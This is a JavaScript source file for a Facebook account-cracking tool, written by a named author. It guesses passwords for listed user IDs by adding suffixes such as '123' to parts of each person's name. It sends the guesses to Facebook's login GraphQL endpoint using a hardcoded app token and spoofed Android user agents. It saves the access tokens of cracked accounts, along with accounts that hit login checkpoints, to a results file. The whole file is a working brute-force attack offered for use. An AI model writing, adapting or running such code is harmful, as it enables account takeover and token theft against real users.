"use strict";

/**
 * Author: Khamdihi Dev
 * Created: 07 January 2025
 * Contact: wa.me/+6283853140469
 */

import fs from 'fs';
import path from 'path';
import pLimit from 'p-limit';
import axios from 'axios';
import { v4 as uuidv4 } from 'uuid';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

let loop = 0, ok = 0, cp = 0, skip = 0

export class Crack {
    constructor(userlist) {
        this.user = userlist;
    }

    async Facebook() {
        if (this.user.length == 0) {
            console.log('\nTidak ada id untuk memproses crack');
            process.exit(1);
        } else {
            await this.MainBrute();
        }
    };

    async MainBrute() {
        console.log('\r\n[+] ON Procces\n')
        const Limits = pLimit(30);
        const tasks = this.user.map((user) =>
            Limits(async () => {
                const [userid, nama] = user.split('|');

                const password = (nama) => {
                    const words = nama.split(' ');
                    const listsub = ['123', '1234', '12345'];
                    let pwx = [];

                    words.forEach((word) => {
                        if (word.length >= 3) {
                            listsub.forEach((suffix) => {
                                pwx.push(word + suffix);
                            });
                        }
                    });

                    if(nama.length >= 5) {
                        pwx.push(nama);
                    }

                    return pwx;
                };

                const listpwx = password(nama.toLowerCase());
                await this.Smartlock(userid, listpwx);
            })
        );

        await Promise.all(tasks);
        process.exit()
    }

    async Smartlock(userid, listpasw) {
        process.stdout.write(`\r[+] Processed: ${loop}, OK: ${ok}, CP: ${cp}, SKIP: ${skip}`);
        try {
            loop+=1
            for (const pwx of listpasw) {
                const headers = {
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-sim-hni': '51009',
                    'x-fb-net-hni': '51009',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'x-graphql-client-library': 'graphservice',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                    'x-tigon-is-retry': 'False',
                    'x-fb-privacy-context': '3643298472347298',
                    'x-graphql-request-purpose': 'fetch',
                    'x-fb-device-group': '5530',
                    'User-Agent': generateRandomUserAgent(),
                    'x-fb-connection-type': 'WIFI',
                    'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'Accept-Encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Tigon/Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                };
                const data = new URLSearchParams({
                    method: 'post',
                    pretty: 'false',
                    format: 'json',
                    server_timestamps: 'true',
                    locale: 'id_ID',
                    purpose: 'fetch',
                    fb_api_req_friendly_name: 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                    fb_api_caller_class: 'graphservice',
                    client_doc_id: '11994080425603935587861051615',
                    variables: JSON.stringify({
                        params: {
                            params: JSON.stringify({
                                server_params: {
                                    family_device_id: `${uuidv4()}`,
                                    device_id: `${uuidv4()}`,
                                    machine_id: '',
                                    from_native_screen: true,
                                    contact_point: userid,
                                    encrypted_password: `#PWD_FB4A:0:${Math.floor(Date.now() / 1000)}:${pwx}`,
                                }
                            }),
                            bloks_versioning_id: '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720',
                            app_id: 'com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request'
                        },
                        scale: '1.5',
                        nt_context: {
                            using_white_navbar: true,
                            styles_id: '790c12baa860bb932decc340a5291740',
                            pixel_ratio: 1.5,
                            is_push_on: true,
                            debug_tooling_metadata_token: null,
                            is_flipper_enabled: false,
                            theme_params: [],
                            bloks_version: '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720'
                        }
                    }),
                    fb_api_analytics_tags: '["GraphServices"]',
                    client_trace_id: `${uuidv4()}`,
                });
                const response = await axios.post('https://b-graph.facebook.com/graphql', data, { headers });
                if (response.data.data && response.data.data.fb_bloks_action.root_action) {
                    const server_respon1 = response.data.data.fb_bloks_action.root_action.action.action_bundle.bloks_bundle_action
                    const server_respon2 = server_respon1.replace(/\\+/g, '');
                    if (server_respon2.includes('session_key') || server_respon2.includes('EAAAAU')) {
                        const token = server_respon2.match(/"access_token":"([^"]+)"/)[1];
                        console.log(`\r * --> ${userid}|${pwx}|${token}`);
                        ok+=1;
                        await this.saveHasil(`[OK] ${userid}|${pwx}|${token}\n`);
                        return;
                    } else if(server_respon2.includes('redirect_login_challenges')){
                        console.log(`\r * --> ${userid}|${pwx}`);
                        cp+=1;
                        await this.saveHasil(`[CP] ${userid}|${pwx}\n`);
                        return;
                    } else {
                        continue;
                    }
                } else {
                    skip+=1
                }
            }
        } catch (er) {
            await this.delai(20000)
            await this.Smartlock(userid, listpasw);
        }
    };

    async delai(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));

    };

    async saveHasil(data) {
        const folderName = path.join(__dirname, 'data');
        const fileName = 'hasil.txt';
        const filePath = path.join(folderName, fileName);
        fs.mkdir(folderName, { recursive: true }, (err) => {
            if (err) return console.error('Gagal membuat folder:', err);

            fs.appendFile(filePath, data, 'utf8', (err) => {
                if (err) console.error('Gagal menulis file:', err);
            });
        });

    }

};


function generateRandomUserAgent() {
    const randomFloat = (min, max) => (Math.random() * (max - min) + min).toFixed(5);
    const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const fbVersion = `${randomInt(100, 600)}.0.0.${randomInt(10, 99)}.${randomInt(10, 99)}`;
    const fbBuildVersion = randomInt(600000000, 999999999);
    const density = randomFloat(1.0, 4.0);
    const width = randomInt(720, 1440);
    const height = randomInt(1280, 2560);
    const carrier = ['Telkomsel', 'XL', 'Indosat', 'Smartfren', 'Tri'][randomInt(0, 4)];
    const deviceBrands = ['google', 'samsung', 'xiaomi', 'oppo', 'vivo'];
    const deviceModels = ['Pixel 5', 'Galaxy S21', 'Redmi Note 10', 'A74', 'Y21'];
    const deviceBrand = deviceBrands[randomInt(0, deviceBrands.length - 1)];
    const deviceModel = deviceModels[randomInt(0, deviceModels.length - 1)];
    const androidVersion = randomInt(7, 12);
    return `[FBAN/FB4A;FBAV/${fbVersion};FBBV/${fbBuildVersion};FBDM/{density=${density},width=${width},height=${height}};FBLC/id_ID;FBRV/0;FBCR/${carrier};FBMF/${deviceBrand};FBBD/${deviceBrand};FBPN/com.facebook.katana;FBDV/${deviceModel};FBSV/${androidVersion};FBOP/1;FBCA/x86_64:arm64-v8a;]`;
}

